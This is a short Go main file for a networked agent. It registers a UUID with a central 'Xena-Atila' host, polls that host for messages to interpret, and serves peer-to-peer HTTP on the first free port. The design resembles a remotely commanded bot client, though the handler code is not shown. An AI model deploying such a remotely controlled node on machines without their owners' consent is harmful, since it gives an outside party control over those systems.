package main

import (
	"fmt"
	"net/http"
	"os"
	"strconv"

	"github.com/google/uuid"
)

// Xena-Atila.
var centralizedHost string = os.Args[1]

// Used for authentication.
// var privateKey = generatePrivateKey()

// Generate the unique identifier.
var id uuid.UUID = uuid.New()

func main() {
	fmt.Println(id)

	// Identifies itself to the Xena-Atila.
	identify(id.String())

	// Fetch new messages in a non-blocking loop.
	go fetchAndInterpretMessages(id.String())

	// Our main router used for interpreting Peer 2 Peer communication.
	http.HandleFunc("/", globalRequestHandler)

	// Generate a port to which we may bind to.
	appPort := currentActivePort()

	// Boot our HTTP web server used for Peer 2 Peer communication
	// Later we shall change server's port based on the current time.
	// This would be done without restarting the program. (yet to be implemented, feel free to open a Pull-Request)
bootServer:
	fmt.Println("Trying port", appPort)
	error := http.ListenAndServe(":"+strconv.Itoa(appPort), nil)
	if error != nil {
		appPort++
		goto bootServer
	}
}
